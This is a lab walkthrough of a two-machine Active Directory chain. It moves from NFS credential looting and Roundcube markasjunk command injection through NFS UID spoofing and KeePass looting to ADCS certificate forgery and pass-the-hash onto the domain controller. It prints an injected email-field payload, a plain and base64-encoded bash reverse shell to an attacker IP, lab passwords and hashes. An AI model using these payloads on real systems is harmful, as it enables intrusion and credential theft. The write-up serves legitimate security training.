The AD Chain contains 2 machines – the roundcube mail server and the DC. In order to complete this lab, you would need to compromise the mail server in order to get to the DC by forging an active directory certificate.

# NMAP:

```bash
sudo nmap -sC -sV -Pn  10.10.252.181-182 --open 
```


```output
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-02 11:46:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2025-10-02T11:35:17
|_Not valid after:  2026-10-02T11:35:17
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2025-10-02T11:35:17
|_Not valid after:  2026-10-02T11:35:17
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2025-10-02T11:35:17
|_Not valid after:  2026-10-02T11:35:17
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2025-10-02T11:35:17
|_Not valid after:  2026-10-02T11:35:17
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-02T11:48:03+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HYBRID
|   NetBIOS_Domain_Name: HYBRID
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hybrid.vl
|   DNS_Computer_Name: dc01.hybrid.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-02T11:47:23+00:00
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Not valid before: 2025-10-01T11:44:05
|_Not valid after:  2026-04-02T11:44:05
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-02T11:47:27
|_  start_date: N/A


```


```output
map scan report for 10.10.252.182
Host is up (0.030s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)
|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Redirecting...
|_http-server-header: nginx/1.18.0 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP SASL CAPA STLS UIDL RESP-CODES PIPELINING AUTH-RESP-CODE
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40637/udp   mountd
|   100005  1,2,3      52189/udp6  mountd
|   100005  1,2,3      56949/tcp6  mountd
|   100005  1,2,3      59907/tcp   mountd
|   100021  1,3,4      34292/udp6  nlockmgr
|   100021  1,3,4      40989/tcp   nlockmgr
|   100021  1,3,4      44261/tcp6  nlockmgr
|   100021  1,3,4      60046/udp   nlockmgr
|   100024  1          33120/udp6  status
|   100024  1          35027/udp   status
|   100024  1          35675/tcp6  status
|   100024  1          42233/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: listed ID IMAP4rev1 LOGINDISABLEDA0001 capabilities OK more post-login Pre-login STARTTLS SASL-IR have LITERAL+ ENABLE LOGIN-REFERRALS IDLE
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
587/tcp  open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: post-login ID IMAP4rev1 AUTH=PLAIN listed OK more AUTH=LOGINA0001 Pre-login LITERAL+ SASL-IR have capabilities ENABLE LOGIN-REFERRALS IDLE
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: TOP SASL(PLAIN LOGIN) CAPA RESP-CODES UIDL USER PIPELINING AUTH-RESP-CODE
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs_acl  3 (RPC #100227)
Service Info: Host:  mail01.hybrid.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at 

```


### web server redirect

I also navigate directly to the mail server via its IP and I get redirected to mail01.hybrid.vl

![[Pasted image 20251002125703.png]]
I make sure to add the IP in `/etc/hosts` file and navigate to the URL via the browser:

```bash
cat /etc/hosts 
10.10.252.181 dc01.hybrid.vl    hybrid.vl
10.10.252.182 mail01.hybrid.vl  hybrid.vl
```

We now see a login page for Roundcube Webmail.

![[Pasted image 20251002130304.png]]

### NFS Mount

If we go back to nmap scan we can also see an NFS mount on the mail server.

```bash
showmount -e 10.10.252.182
```

```output
Export list for 10.10.252.182:
/opt/share *
```

Now we will mount to the NFS share:

```bash
sudo mkdir -p /mnt/remote_share
sudo mount -t nfs 10.10.252.182:/opt/share /mnt/remote_share
cd /mnt/remote_share
```

lets check 
```bash
ls -la                                                  
total 16
drwxrwxrwx 2 nobody nogroup 4096 Jun 18  2023 .
drwxr-xr-x 3 root   root    4096 Oct  2 08:13 ..
-rw-r--r-- 1 root   root    6003 Jun 18  2023 backup.tar.gz
```

There is a .zip file on the share and we unzip it with tar and investigate the contents:

```bash
tar -xzf backup.tar.gz
```

```bash
(kali㉿kali)-[/mnt/remote_share/etc/dovecot]
└─$ cat dovecot-users
admin@hybrid.vl:{plain}Duckling21
peter.turner@hybrid.vl:{plain}PeterIstToll!
```

I go back to the login page and I’m able to login to both accounts:

![[Pasted image 20251002132940.png]]

## Initial Foothold – Roundcube Webmail RCE

I read the message from the admin and see a clue for the initial foothold.

![[Pasted image 20251002133036.png]]

Doing a google search with those keywords we can see an advisory for mark as junk RCE.

[`https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/`](https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/)

From the post, we can add a payload to perform an RCE. We can do this by performing an RCE to execute an RFI to gain a shell into the machine with the following payload:

## Foothold

Following an [article](https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/) for remote code execution on `markasjunk` plugin we can execute commands by changing the email address of a user by using `${IFS}` which is a variable in bash that represents a space, tab and a new line character
```bash
admin&curl${IFS}10.8.7.96&@hybrid.vl
```


![[Pasted image 20251002134312.png]]

Now mark any email as junk

![[Pasted image 20251002134359.png]]

We’ll get a callback on our listener, so the commands are getting executed

```bash
bash -i >& /dev/tcp/10.8.0.136/2222 0>&1  
  
admin&echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjAuMTM2LzIyMjIgMD4mMQo=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash&@hybrid.vl
```


![[Pasted image 20251002140758.png]]


On doing the same procedure, we’ll get a reverse shell as `www-data`

![[Pasted image 20251002140836.png]]
In `/home` we only see one user which is a domain user, `peter.turner`, I tried switching to peter by using his roudcube password but it didn't worked

![[Pasted image 20251002140906.png]]
I tried cracking the password of `privkey.pem` but it took a long time so I decided to give up on that

![[Pasted image 20251002140940.png]]
Reading `/etc/exports` file, we can see there's no `no_root_squash` so we cannot place bash binary owned by root user
![[Pasted image 20251002141008.png]]

We know there’s peter.turner on the victim machine with the id `902601108`

![[Pasted image 20251002141043.png]]

Before creating the user with the same uid on our machine we need to allow the creation of uids above 60000 range
![[Pasted image 20251002141110.png]]

Edit the `/etc/logins.defs` and change the `UID_MAX` value
![[Pasted image 20251002141135.png]]

![[Pasted image 20251002141152.png]]
Now copying bash binary in the mounted folder
![[Pasted image 20251002141222.png]]
We can see that this binary is owned by peter.turner since we used the same UID and it’s a SUID, but on executing it wasn’t being executed due to a different GLIBC version, so instead transferring the bash binary from the victim machine and making it a SUID
![[Pasted image 20251002141309.png]]

![[Pasted image 20251002141323.png]]
From peter’s home directory, we can find `passwords.kdbx` file which is a keepass password safe file
![[Pasted image 20251002141352.png]]

![[Pasted image 20251002141405.png]]
Reading the kdbx file with `kpcli` , it’s going to ask for a master password
![[Pasted image 20251002141432.png]]
Using peter’s roudcube password it worked on this file
![[Pasted image 20251002141457.png]]
From `hybrid.vl` entry we can get the password of peter
![[Pasted image 20251002141555.png]]
We can use this password to check privileges of peter, which can run anything as root

![[Pasted image 20251002141630.png]]


![[Pasted image 20251002141648.png]]
Running `python-bloodhound` to enumerate the `trusted.vl` domain
```bash
python3 /opt/BloodHound.py-Kerberos/bloodhound.py -d 'hybrid.vl' -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -gc 'dc01.hybrid.vl' -ns 10.10.132.229
```


![[Pasted image 20251002141752.png]]
From bloodhound, there wasn’t any path from peter leading to domain admin

![[Pasted image 20251002141819.png]]


Enumerating ADCS with `[certipy](https://github.com/ly4k/Certipy)` for vulnerable certificates

```bash
certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -vulnerable -stdout -dc-ip 10.10.228.165
```

![[Pasted image 20251002141922.png]]
Members of `Authenticated users` can enroll and authenticate any user with `hybrid-DC01-CA` (ESC-1), using `old-bloodhound` to get the result in json file so we can view it in bloodhound
```bash
certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.147.37 -old-bloodhound

```

![[Pasted image 20251002142024.png]]
Make sure to add [custom queries](https://raw.githubusercontent.com/ly4k/Certipy/main/customqueries.json) for ADCS in `~./config/bloodhound/customqueries.json` to analyze ADCS in the domain
![[Pasted image 20251002142054.png]]

After putting the custom queries we can see the templates being reflected on bloodhound
![[Pasted image 20251002142132.png]]

Marking `hybrid-DC01-CA` as the high value target and checking the shortest path to hybrid-DC01-CA
![[Pasted image 20251002142205.png]]

So now we need MAIL01’s hash, going back to linux machine as root user, we can extract the NTHash using [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) from `/etc/krb5.keytab`

![[Pasted image 20251002142333.png]]


![[Pasted image 20251002142351.png]]
From certipy we didn’t found any template names, from bloodhound we can see two templates from which using `HYBRIDCOMPUTERS`
![[Pasted image 20251002142423.png]]

On requesting the certificate, it was giving an error related to public key requirement
![[Pasted image 20251002142452.png]]
Checking the pem file we have, we can see the size of the public key, which is 4096 bit

![[Pasted image 20251002142515.png]]
Specifying the size of the public key file and requesting the certificate to authenticate as administrator

```bash
certipy req -u 'MAIL01$' -hashes ":0f916c5246fdbc7ba95dcef4126d57bd" -dc-ip "10.10.228.165" -ca 'hybrid-DC01-CA' -template 'HYBRIDCOMPUTERS' -upn 'administrator' -target 'dc01.hybrid.vl' -key-size 4096

```

![[Pasted image 20251002142703.png]]

Now again with certipy we can request administrator's NTHash

```bash
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.228.165
```


![[Pasted image 20251002142839.png]]
We can get a shell through `wmiexec`
```bash
wmiexec.py administrator@10.10.252.181 -hashes ':60701e8543c9f6db1a2af3217386d3dc'
```

```output
C:\users\administrator\Desktop>type root.txt
VL{6b069f0bfac70efd8a17c2d1aa79f208}
C:\users\administrator\Desktop>
```






















